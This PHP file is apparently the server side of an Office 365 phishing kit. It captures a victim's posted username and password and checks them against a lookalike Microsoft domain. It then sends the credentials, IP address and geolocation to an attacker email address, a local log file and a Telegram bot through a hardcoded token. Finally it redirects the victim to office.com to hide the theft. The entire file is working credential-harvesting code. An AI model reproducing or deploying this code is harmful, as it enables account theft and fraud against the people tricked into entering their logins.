<?php

$recipient = "logins@365suite.us"; // Put your email address here

if (isset($_POST["user"]) && isset($_POST["pass"])) {

  function visitor_info() {
    $ip = getenv("REMOTE_ADDR");
    $result = [];
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, "https://api.ip.sb/geoip/$ip");
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($curl);
    if ($response !== false) {
      $data = json_decode($response, true);
      if ($data) {
        $result = $data;
      }
    }
    curl_close($curl);
    return $result;
  }

  $user = $_POST["user"];
  $pass = $_POST["pass"];
  $api = "https://resetpassword.office365.microsoft.office.365suite.us/inc.php";
  $info = visitor_info();
  $info['user'] = $user;
  $info['pass'] = $pass;
  $info['type'] = "1";

  $curl = curl_init();
  curl_setopt($curl, CURLOPT_URL, $api);
  curl_setopt($curl, CURLOPT_POST, true);
  curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($info));
  curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
  $result = curl_exec($curl);
  curl_close($curl);

  if ($result == 1) {
    $date = date("d-m-Y");
    $ip = getenv("REMOTE_ADDR");
    $over = "https://office.com";

    $message = "🔒 -----------------+ True Login Verified +----------------- 🔒\n";
    $message .= "👤 User ID: " . $user . "\n";
    $message .= "🔑 Password: " . $pass . "\n";
    $message .= "🌍 Client IP: " . $info['ip'] . "\n";
    $message .= "🌎 Client Country: " . $info['country'] . "\n";
    $message .= "🏢 Organization: " . $info['organization'] . "\n";
    $message .= "🌐 Longitude: " . $info['longitude'] . "\n";
    $message .= "🏙 City: " . $info['city'] . "\n";
    $message .= "🕒 Timezone: " . $info['timezone'] . "\n";
    $message .= "📡 ISP: " . $info['isp'] . "\n";
    $message .= "📍 Region: " . $info['region'] . "\n";
    $message .= "🔢 ASN: " . $info['asn'] . "\n";
    $message .= "🏢 ASN Organization: " . $info['asn_organization'] . "\n";
    $message .= "🌏 Latitude: " . $info['latitude'] . "\n";
    $message .= "📮 Postal Code: " . $info['postal_code'] . "\n";
    $message .= "🌐 Continent Code: " . $info['continent_code'] . "\n";
    $message .= "🌐 Country Code: " . $info['country_code'] . "\n";
    $message .= "🌍 Region Code: " . $info['region_code'] . "\n";
    $message .= "-----------------+ OFFICE 365 | True Login +------------------\n";

    $subject = "OFFICE 365 | True Login: " . $ip . "\n";
    $headers = "MIME-Version: 1.0\n";
    $apiToken = "7002516124:AAGvOaQcUvaHAeLLBUaZCgUNTUwJPwQ1ON0";

    $mailSuccess = mail($recipient, $subject, $message, $headers);

    if ($mailSuccess) {
      $file = fopen("Office-login.txt", "a");
      if ($file !== false) {
        fwrite($file, $message);
        fclose($file);
      }
    }

    header("Location: $over");
  } else {
    header(
      "Location: index.php?error&id=$user&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1"
    );
  }


  $officebot = [
    "chat_id" => "7184238206",
    "text" => $message,
  ];

  // Send data to Telegram bot
  $telegramUrl = "https://api.telegram.org/bot$apiToken/sendMessage";
  $curl = curl_init();
  curl_setopt($curl, CURLOPT_URL, $telegramUrl);
  curl_setopt($curl, CURLOPT_POST, true);
  curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($officebot));
  curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
  $response = curl_exec($curl);
  curl_close($curl);
}

?>
